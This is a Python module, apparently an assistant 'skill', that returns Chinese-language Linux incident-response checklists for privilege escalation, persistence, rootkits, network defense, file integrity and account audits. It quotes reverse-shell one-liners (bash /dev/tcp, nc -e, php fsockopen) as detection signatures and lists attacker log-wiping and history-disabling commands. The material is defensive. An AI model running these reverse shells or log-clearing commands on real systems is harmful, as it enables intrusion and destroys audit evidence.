"""Linux 安全 Skill — 权限/进程/持久化/提权检测 实操命令"""


def handle(question: str, context: str = "") -> str:
    q = (question + " " + context).lower()

    # 提权 / SUID
    if _match(q, ["提权", "suid", "privilege", "root", "sudo", "capability"]):
        return _privilege_escalation(q)

    # 后门 / 持久化
    if _match(q, ["后门", "持久化", "backdoor", "persist", "cron", "定时任务",
                   "启动项", "rc.local", "systemd", "ssh key", "sshkey"]):
        return _persistence(q)

    # 进程 / 隐藏
    if _match(q, ["进程", "process", "隐藏", "hide", "rootkit", "内核模块", "lkm"]):
        return _process_detection(q)

    # 反弹 Shell
    if _match(q, ["反弹", "reverse shell", "shell", "nc ", "bash -i", "/dev/tcp"]):
        return _reverse_shell()

    # 日志 / 清理
    if _match(q, ["日志", "log", "清理", "清除", "覆盖", "痕迹", "history"]):
        return _log_cleanup()

    # 防火墙 / 网络
    if _match(q, ["iptables", "防火墙", "firewall", "端口", "netstat", "ss ",
                   "lsof", "网络连接", "外联"]):
        return _network_defense(q)

    # 文件完整性
    if _match(q, ["文件", "file", "篡改", "完整性", "校验", "md5", "sha", "aide", "tripwire"]):
        return _file_integrity()

    # 账户安全
    if _match(q, ["用户", "账户", "密码", "passwd", "shadow", "rootkit", "新增用户",
                   "uid 0", "sudoers"]):
        return _account_security()

    # 默认：Linux 安全速查
    return _quick_ref()


def _match(text: str, keywords: list) -> bool:
    return any(kw.lower() in text for kw in keywords)


def _privilege_escalation(q: str) -> str:
    return """[Linux] 提权检测清单：

## SUID 提权检测
```
# 找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 关注异常的 SUID（非系统自带）
find / -perm -4000 -user root -not -path '/usr/*' -not -path '/bin/*' 2>/dev/null

# GTFO 常见利用项
ls -la /usr/bin/find /usr/bin/vim /usr/bin/python* /usr/bin/perl /usr/bin/bash
```

## Sudo 配置审计
```
sudo -l                          # 当前用户 sudo 权限
cat /etc/sudoers | grep -v '^#' | grep -v '^$'   # 排除注释
grep 'NOPASSWD' /etc/sudoers     # 免密 sudo（高危）
```

## Capability 检测
```
getcap -r / 2>/dev/null          # 所有文件的 capability
# 关注 cap_setuid, cap_sys_admin, cap_net_raw
```

## 内核漏洞提权
```
uname -a                         # 看内核版本
# 对照 Exploit-DB / linux-exploit-suggester
```"""


def _persistence(q: str) -> str:
    return """[Linux] 持久化后门检测：

## Cron 定时任务
```
crontab -l                        # 当前用户
cat /etc/crontab                  # 系统级
ls -la /etc/cron.* /var/spool/cron/
# 关注: 异常时间、隐藏目录、下载执行
```

## Systemd 服务后门
```
systemctl list-units --type=service --state=running
find /etc/systemd/system -name '*.service' -mtime -7  # 最近7天新建
# 检查 ExecStart 指向的可疑路径
```

## rc.local / 启动脚本
```
cat /etc/rc.local
cat /etc/profile /etc/bash.bashrc ~/.bashrc ~/.profile
# 关注: wget xxx | bash / nc 外联 / 反弹shell
```

## SSH 后门
```
cat ~/.ssh/authorized_keys        # 是否有陌生公钥
grep 'AuthorizedKeysFile' /etc/ssh/sshd_config
find / -name 'authorized_keys' 2>/dev/null
```

## LD_PRELOAD 劫持
```
cat /etc/ld.so.preload
# 检查是否有异常 .so 文件劫持系统调用
```"""


def _process_detection(q: str) -> str:
    return """[Linux] 进程/隐藏检测：

## 可疑进程排查
```
ps auxf                          # 树形显示父子关系
ps aux --sort=-%mem | head -20   # 内存 Top20
ps aux --sort=-%cpu | head -20   # CPU Top20
```

## 异常外联进程
```
lsof -i -P -n | grep ESTABLISHED
ss -tunap | grep ESTAB
netstat -tunap | grep -v '127.0.0.1\|::1'
```

## Rootkit 基础检测
```
# 对比 ps 和 /proc 是否一致（内核级 rootkit 会隐藏进程）
ls /proc | grep -E '^[0-9]+$' | while read pid; do
  [ -f /proc/$pid/cmdline ] && cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ' && echo " (PID=$pid)"
done > /tmp/proc_list

# 检查隐藏内核模块
cat /proc/modules | grep -v '^$'
# 用 chkrootkit / rkhunter 进一步确认
```

## eBPF 后门检测
```
bpftool prog list                # 列出所有 BPF 程序
# 异常 BPF 程序可能用于流量劫持/隐藏
```"""


def _reverse_shell() -> str:
    return """[Linux] 反弹 Shell 检测：

## 常见 Payload 特征
```
bash -i >& /dev/tcp/IP/PORT 0>&1
nc -e /bin/sh IP PORT
python -c 'import socket,subprocess,os;s=socket.socket(...)'
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## 检测手法
```
# 1. 查异常 /dev/tcp 连接（bash 反弹特征）
lsof 2>/dev/null | grep '/dev/tcp'

# 2. 查 nc / python / php 等工具发起的异常外联
lsof -i -P -n | grep -E 'nc|python|php|perl|ruby'

# 3. 查子进程关系异常
ps auxf | grep -A 2 'nc\|bash -i\|python -c'

# 4. 网络连接 + 进程关联
ss -tunap | grep -v '127.0.0.1'
```"""


def _log_cleanup() -> str:
    return """[Linux] 日志清除痕迹检测：

## 常见清除手法
```
# 攻击者常用：
echo '' > /var/log/auth.log          # 清空认证日志
echo '' > /var/log/syslog
echo '' > ~/.bash_history            # 清除命令历史
unset HISTFILE && kill -9 $$         # 不记录当前会话
export HISTSIZE=0                    # 禁止记录历史
ln -sf /dev/null ~/.bash_history    # 历史指向空设备
```

## 检测方法
```
# 1. 日志文件大小突变
ls -la /var/log/auth.log* /var/log/syslog* /var/log/secure*

# 2. 检查最近修改
find /var/log -mtime -3 -ls          # 最近3天修改的日志

# 3. 检查 utmp/wtmp/btmp（登录记录）
last -f /var/log/wtmp | head -30     # 最近登录
lastb | head -20                      # 失败登录
who /var/log/utmp                     # 当前在线

# 4. 检查 ~/.bash_history 是否被篡改
stat ~/.bash_history                  # 看大小和修改时间
```"""


def _network_defense(q: str) -> str:
    return """[Linux] 网络层防御与检测：

## iptables 应急封锁
```
# 封锁攻击 IP
iptables -A INPUT -s ATTACKER_IP -j DROP
iptables -A OUTPUT -d ATTACKER_IP -j DROP

# 限制 SSH 爆破
iptables -A INPUT -p tcp --dport 22 -m recent --set --name ssh
iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 5 --name ssh -j DROP

# 查看规则
iptables -L -n -v
```

## 异常连接检测
```
ss -tunap | grep -E 'ESTAB|LISTEN'
netstat -tunap | grep -v '127.0.0.1'

# DNS 隧道检测（异常长域名）
tcpdump -i eth0 port 53 -v | grep -E '.{50,}'

# ICMP 隧道检测（大包）
tcpdump -i eth0 icmp | grep -E 'length [0-9]{3,}'
```

## 端口监听审计
```
ss -tunlp | grep LISTEN             # 所有监听端口
# 关注: 非标准端口上的 HTTP/SSH 服务
```"""


def _file_integrity() -> str:
    return """[Linux] 文件完整性检测：

## 关键目录哈希基线
```
# 建立基线
find /bin /sbin /usr/bin /usr/sbin -type f -exec md5sum {} \\; > /root/baseline.md5
# 定期对比
md5sum -c /root/baseline.md5 | grep FAILED
```

## 最近修改的可疑文件
```
find / -type f -mtime -3 2>/dev/null | grep -v '/proc\|/sys\|/dev\|/run'
find /var/www -name '*.php' -mtime -3    # Web 目录新文件
find /tmp /dev/shm /var/tmp -type f       # 临时目录
```

## 无属主文件
```
find / -nouser -o -nogroup 2>/dev/null
# 可能是已删除用户留下的后门
```"""


def _account_security() -> str:
    return """[Linux] 账户安全审计：

## 新增账户检测
```
# 检查最近修改的账户文件
ls -la /etc/passwd /etc/shadow /etc/group

# UID 0 账户（只应有 root）
awk -F: '($3 == 0) {print $1}' /etc/passwd

# 空密码账户
awk -F: '($2 == "" || $2 == "!") {print $1}' /etc/shadow

# 可登录账户
grep -v '/nologin\|/false' /etc/passwd
```

## sudoers 审计
```
grep -v '^#' /etc/sudoers | grep -v '^$'
cat /etc/sudoers.d/* 2>/dev/null
# 关注: ALL=(ALL) NOPASSWD:ALL
```

## SSH 配置加固
```
grep -E 'PermitRootLogin|PasswordAuthentication|Port' /etc/ssh/sshd_config
# 推荐: PermitRootLogin no + PasswordAuthentication no + 改端口
```"""


def _quick_ref() -> str:
    return """[Linux] 安全速查卡：

## 应急三板斧
```
ps auxf              # 看进程树
netstat -tunap       # 看网络连接
cat ~/.bash_history  # 看命令历史
```

## 常见后门位置
```
~/.ssh/authorized_keys       # SSH 公钥后门
/etc/crontab + /var/spool/cron/  # 定时任务
/etc/systemd/system/         # Systemd 服务
/etc/ld.so.preload           # 动态库劫持
/tmp /dev/shm /var/tmp       # 临时目录隐藏
```

## 提权速查
```
sudo -l                    # 你能 sudo 什么
find / -perm -4000 2>/dev/null  # SUID 文件
getcap -r / 2>/dev/null    # Capability
uname -a                   # 内核版本
```

## 基础加固
```
# SSH
sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# 防火墙
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 3 -j DROP

# 审计
auditctl -w /etc/passwd -p wa -k passwd_change
auditctl -w /etc/shadow -p wa -k shadow_change
```"""
